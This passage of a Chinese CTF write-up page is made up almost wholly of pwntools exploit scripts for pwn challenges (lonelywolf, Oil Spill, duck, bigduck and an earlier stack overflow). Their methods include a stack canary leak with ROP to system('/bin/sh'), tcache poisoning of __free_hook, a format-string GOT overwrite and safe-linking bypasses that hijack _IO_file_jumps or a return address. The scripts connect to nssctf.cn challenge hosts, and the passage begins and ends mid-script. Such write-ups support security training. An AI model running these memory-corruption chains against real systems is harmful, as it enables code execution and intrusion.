class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">p1</span>=b&#x27;a&#x27;*(0x50-8-1)+b&#x27;A&#x27;<br>sla(<span class="hljs-string">&quot;Do you know how to do buffer overflow?&quot;</span>,p1)<br>ru(<span class="hljs-string">&#x27;A&#x27;</span>)<br><span class="hljs-attribute">canary</span>=u64(rc(8))-0xa<br><span class="hljs-attribute">p2</span>=b&#x27;a&#x27;*(0x50-8)+p64(canary)+p64(ret)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>sla(<span class="hljs-string">&quot;Try harder!&quot;</span>,p2)<br>ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-attribute">puts_addr</span>=rcg()<br><span class="hljs-built_in">print</span>(hex(canary))<br><span class="hljs-built_in">print</span>(hex(puts_addr))<br><span class="hljs-attribute">base</span>=puts_addr-0x080aa0<br><span class="hljs-attribute">s</span>=0x04f550+base<br><span class="hljs-attribute">bs</span>=0x1b3e1a+base<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x50-8)+p64(canary)+p64(ret)*2+p64(rdi)+p64(bs)+p64(s)+p64(0)<br>sla(<span class="hljs-string">&quot;Do you know how to do buffer overflow?&quot;</span>,p)<br>sla(<span class="hljs-string">&quot;Try harder!&quot;</span>,p)<br><span class="hljs-built_in">print</span>(hex(canary))<br><span class="hljs-built_in">print</span>(hex(puts_addr))<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="CISCN-2021-初赛-lonelywolf"><a href="#CISCN-2021-初赛-lonelywolf" class="headerlink" title="[CISCN 2021 初赛]lonelywolf"></a>[CISCN 2021 初赛]lonelywolf</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io_ch</span>=0<br><span class="hljs-attribute">de_bug</span>=1<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.anna.nssctf.cn&#x27;,28167)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-comment">#libc=ELF(&#x27;/home/lekc/pwntools/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;)</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda : u64(rc(6).ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>def cmd(c):<br>sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,str(c))<br>def <span class="hljs-built_in">add</span>(size):<br>cmd(1)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,str(0))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>,str(size))<br>def <span class="hljs-built_in">edit</span>(data):<br>cmd(2)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,str(0))<br>sla(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br>def show():<br>cmd(3)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,str(0))<br>def free():<br>cmd(4)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,str(0))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-built_in">add</span>(0x78)<br>free()<br>show()<br><span class="hljs-attribute">p1</span>=p64(0)*2#清除key<br><span class="hljs-built_in">edit</span>(p1)<br>free()<br>show()<br>ru(<span class="hljs-string">&quot;Content: &quot;</span>)<br><span class="hljs-attribute">chunk1_fd</span>=rcg()<br><span class="hljs-attribute">tcache_base</span>=chunk1_fd-0x250<br><span class="hljs-attribute">p2</span>=p64(tcache_base)<br><span class="hljs-built_in">edit</span>(p2)<br><span class="hljs-built_in">add</span>(0x78)<br><span class="hljs-built_in">add</span>(0x78)<br><span class="hljs-attribute">p3</span>=p64(0)*4+p64(0x0000000007000000)<br><span class="hljs-built_in">edit</span>(p3)<br>free()<br>show()<br>ru(<span class="hljs-string">&quot;Content: &quot;</span>)<br><span class="hljs-attribute">main_arean_96</span>=rcg()<br><span class="hljs-attribute">main_arean</span>=main_arean_96-96<br><span class="hljs-attribute">malloc_hook</span>=main_arean-0x10<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;__malloc_hook&#x27;,malloc_hook)<br><span class="hljs-attribute">libc_base</span>=malloc_hook-libc.dump(&#x27;__malloc_hook&#x27;)<br><span class="hljs-attribute">sys</span>=libc_base+0x4f550#不同的libc小版本之间的差异<br><span class="hljs-attribute">free_hook</span>=libc_base+libc.dump(&#x27;__free_hook&#x27;)<br><br><span class="hljs-attribute">p4</span>=b&#x27;\x01&#x27;*8+b&#x27;\x00&#x27;*0x38+p64(free_hook)+p64(tcache_base+0x260)<br><span class="hljs-built_in">edit</span>(p4)<br><span class="hljs-built_in">add</span>(0x18)#利用tcache直接将堆分配到__free_hook<br><span class="hljs-attribute">p5</span>=p64(sys)<br><span class="hljs-built_in">edit</span>(p5)<br><span class="hljs-built_in">add</span>(0x28)<br><span class="hljs-attribute">p6</span>=b&#x27;/bin/sh\x00&#x27;<br><span class="hljs-built_in">edit</span>(p6)<br>free()<br><span class="hljs-built_in">print</span>(hex(libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)))<br><span class="hljs-built_in">print</span>(hex(sys))<br><span class="hljs-built_in">print</span>(hex(free_hook))<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="SDCTF-2022-Oil-Spill"><a href="#SDCTF-2022-Oil-Spill" class="headerlink" title="[SDCTF 2022]Oil Spill"></a>[SDCTF 2022]Oil Spill</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=0<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node5.anna.nssctf.cn&#x27;,28846)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-comment">#libc=ELF(&#x27;&#x27;)</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda : int(rc(12),16)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">x_addr</span>=0x0000000000600C80<br><span class="hljs-attribute">offset</span>=8<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><span class="hljs-attribute">puts_addr</span>=rcg()<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><span class="hljs-attribute">printf_addr</span>=rcg()<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><span class="hljs-attribute">s_addr</span>=rcg()<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><span class="hljs-attribute">temp_addr</span>=int(rc(6),16)<br><span class="hljs-attribute">base</span>=printf_addr-0x064e40<br><span class="hljs-attribute">sy</span>=base+0x04f420<br><span class="hljs-attribute">puts</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">p</span>=fmtstr_payload(offset, &#123;puts:sy,x_addr:b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>&#125;)<br>sla(<span class="hljs-string">&quot;do you have any ideas of what we can use to clean it?&quot;</span>,p)<br><span class="hljs-built_in">print</span>(hex(puts_addr))<br><span class="hljs-built_in">print</span>(hex(printf_addr))<br><span class="hljs-built_in">print</span>(hex(s_addr))<br><span class="hljs-built_in">print</span>(hex(temp_addr))<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="CISCN-2022-华东北-duck"><a href="#CISCN-2022-华东北-duck" class="headerlink" title="[CISCN 2022 华东北]duck"></a>[CISCN 2022 华东北]duck</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>修改_IO_file_jumps中的_IO_new_file_overflow为one-gadget<br>借助puts时会调用_IO_new_file_overflow刷新缓冲区</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=1<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./a&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.anna.nssctf.cn&#x27;,28129)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><br><span class="hljs-attribute">libc</span>=ELF(&#x27;./libc.so.6&#x27;)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda c : u64(rc(c).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) <br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>def cmd(c):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>,str(c))<br>def <span class="hljs-built_in">add</span>():<br>cmd(1)<br>def free(idx):<br>cmd(2)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>,str(idx))<br>def show(idx):<br>cmd(3)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>,str(idx))<br>def <span class="hljs-built_in">edit</span>(idx,data):<br>cmd(4)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>,str(idx))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>,str(len(data)))<br>sla(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>gadget=[0xda861,0xda864,0xda867]<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10):<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-built_in">add</span>()#0-9<br>free(0)<br>show(0)<br>ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-attribute">key</span>=rcg(5)<br><span class="hljs-attribute">chunk_base</span>=key&lt;&lt;12<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(6):<br>free(i+1)#1-6<br><br>free(7)<br>show(7)<br>ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-attribute">main_arena</span>=rcg(6)-96<br><span class="hljs-attribute">libc_base</span>=main_arena-libc.sym[<span class="hljs-string">&#x27;main_arena&#x27;</span>]<br><span class="hljs-attribute">io_file_jumps</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br><span class="hljs-attribute">one</span>=libc_base+gadget[1]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(4):<br>    <span class="hljs-built_in">add</span>() #10-13<br><span class="hljs-attribute">p1</span>=p64(key ^ io_file_jumps)+p64(0)<br><span class="hljs-built_in">edit</span>(2,p1)<br><span class="hljs-built_in">add</span>()#14<br><span class="hljs-built_in">add</span>()#15<br><span class="hljs-attribute">p</span>=p64(0)*3+p64(one)<br><span class="hljs-built_in">edit</span>(15,p)<br><span class="hljs-built_in">print</span>(hex(io_file_jumps))<br><span class="hljs-built_in">print</span>(hex(key^io_file_jumps))<br><span class="hljs-built_in">print</span>(hex(main_arena))<br><span class="hljs-built_in">print</span>(hex(chunk_base))<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>通过environ获得stack地址，并计算它和edit函数返回地址所在的stack地址偏移得到edit的放回地址,修改为rop链</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=1<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./a&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.anna.nssctf.cn&#x27;,28809)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><br><span class="hljs-attribute">libc</span>=ELF(&#x27;./libc.so.6&#x27;)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda c : u64(rc(c).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) <br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>def cmd(c):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>,str(c))<br>def <span class="hljs-built_in">add</span>():<br>cmd(1)<br>def free(idx):<br>cmd(2)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>,str(idx))<br>def show(idx):<br>cmd(3)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>,str(idx))<br>def <span class="hljs-built_in">edit</span>(idx,data):<br>cmd(4)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>,str(idx))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>,str(len(data)))<br>sla(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>gadget=[0xda861,0xda864,0xda867]<br><span class="hljs-attribute">ret_offset</span>=0x000000000002cb99<br><span class="hljs-attribute">rdi_offset</span>=0x000000000002daa2<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10):<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-built_in">add</span>()#0-9<br>free(0)<br>show(0)<br>ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-attribute">key</span>=rcg(5)<br><span class="hljs-attribute">chunk_base</span>=key&lt;&lt;12<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(6):<br>free(i+1)#1-6<br><br>free(7)<br>show(7)<br>ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-attribute">main_arena</span>=rcg(6)-96<br><span class="hljs-attribute">libc_base</span>=main_arena-libc.sym[<span class="hljs-string">&#x27;main_arena&#x27;</span>]<br><span class="hljs-attribute">io_file_jumps</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br><span class="hljs-attribute">ret</span>=libc_base+ret_offset<br><span class="hljs-attribute">rdi</span>=libc_base+rdi_offset<br><span class="hljs-attribute">sy</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">bs</span>=libc_base+libc.search(&#x27;/bin/sh&#x27;).__next__()<br><span class="hljs-attribute">one</span>=libc_base+gadget[1]<br><span class="hljs-attribute">environ</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(4):<br>    <span class="hljs-built_in">add</span>() #10-13<br><span class="hljs-attribute">p1</span>=p64(key ^ environ)+p64(0)<br><span class="hljs-built_in">edit</span>(2,p1)<br><span class="hljs-built_in">add</span>()#14<br><span class="hljs-built_in">add</span>()#15<br>show(15)<br>stack_addr = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x168<br><span class="hljs-attribute">p2</span>=p64(key ^ stack_addr)+p64(0)<br>free(9)<br>free(10)<br><span class="hljs-built_in">edit</span>(10,p2)<br><span class="hljs-built_in">add</span>()#16<br><span class="hljs-built_in">add</span>()#17<br><span class="hljs-comment">#p=p64(0)*3+p64(one)</span><br><span class="hljs-attribute">p</span>=p64(0)*3+p64(rdi)+p64(bs)+p64(sy)<br><span class="hljs-built_in">edit</span>(17,p)<br><span class="hljs-built_in">print</span>(hex(io_file_jumps))<br><span class="hljs-built_in">print</span>(hex(key^io_file_jumps))<br><span class="hljs-built_in">print</span>(hex(main_arena))<br><span class="hljs-built_in">print</span>(hex(chunk_base))<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><h2 id="CISCN-2022-华东北-bigduck"><a href="#CISCN-2022-华东北-bigduck" class="headerlink" title="[CISCN 2022 华东北]bigduck"></a>[CISCN 2022 华东北]bigduck</h2><p>和duck的过environ获得stack地址，并计算它和edit函数返回地址所在的stack地址偏移得到edit的放回地址,修改为rop链做法一样</p><p>区别在与rop链要来执行orw</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>from LibcSearcher import*<br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">1</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./a&#x27;</span><br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span 